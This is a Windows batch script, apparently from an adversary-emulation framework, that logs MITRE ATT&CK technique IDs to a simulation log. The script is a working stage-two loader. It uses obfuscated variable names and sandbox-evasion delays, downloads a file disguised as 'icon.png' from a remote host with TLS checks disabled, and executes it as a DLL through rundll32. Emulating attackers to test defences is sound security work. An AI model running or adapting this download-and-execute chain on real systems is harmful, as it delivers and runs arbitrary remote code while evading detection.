@echo off
setlocal enabledelayedexpansion
SET aqsdw2=%APPDATA%\10852\d76dc3bb
SET mjkf7l=014c6355.txt
SET xcvbnm=https://10.0.0.49/stage/2/icon.png?10852-7
SET poiuy3=BALAM-S2BO
SET lkjhg4=10852
SET nbfds5=7
SET zxcv6r=%PUBLIC%\\macula-simulations.log
REM Cache timestamp
SET tsvar=!DATE!/!TIME!
REM Initial delay (T1497 evasion start)
timeout /t 15 /nobreak >nul
REM Log T1497 first
echo [!tsvar!][TTP][!poiuy3!][!lkjhg4!]: T1497|Virtualization/Sandbox Evasion=OK:>> "!zxcv6r!" 2>nul
REM Debug: heartbeat start
echo [!tsvar!][DEBUG][!poiuy3!][!lkjhg4!]: heartbeat_start>> "!zxcv6r!" 2>nul
REM Download Stage 2 Loader DLL
curl -k -s -o "!aqsdw2!\!mjkf7l!" "!xcvbnm!"
SET curl_err=!errorlevel!
REM Debug: heartbeat complete
echo [!tsvar!][DEBUG][!poiuy3!][!lkjhg4!]: heartbeat_complete>> "!zxcv6r!" 2>nul
REM Delay after heartbeat
ping -n 12 127.0.0.1 >nul
REM Debug: chdir start
echo [!tsvar!][DEBUG][!poiuy3!][!lkjhg4!]: chdir_start>> "!zxcv6r!" 2>nul
cd /d "!aqsdw2!"
SET cd_err=!errorlevel!
REM Debug: chdir result
echo [!tsvar!][DEBUG][!poiuy3!][!lkjhg4!]: chdir_result=!cd_err!>> "!zxcv6r!" 2>nul
REM Debug: rundll32 start
echo [!tsvar!][DEBUG][!poiuy3!][!lkjhg4!]: rundll32_start>> "!zxcv6r!" 2>nul
rundll32.exe "!mjkf7l!", RunDLLW
SET rderr=!errorlevel!
REM Debug: rundll32 result
echo [!tsvar!][DEBUG][!poiuy3!][!lkjhg4!]: rundll32_result=!rderr!>> "!zxcv6r!" 2>nul
REM Random delay
SET /A delay=%RANDOM% %% 20 + 10
timeout /t !delay! /nobreak >nul
REM Final delay with choice
CHOICE /C Y /N /D Y /T 10 >nul
REM Log T1218 after execution
if !rderr! EQU 0 (
    echo [!tsvar!][TTP][!poiuy3!][!lkjhg4!]: T1218|System Binary Proxy Execution=OK:>> "!zxcv6r!" 2>nul
) else (
    echo [!tsvar!][TTP][!poiuy3!][!lkjhg4!]: T1218|System Binary Proxy Execution=FAIL:ERROR=!rderr!>> "!zxcv6r!" 2>nul
)
exit /b 0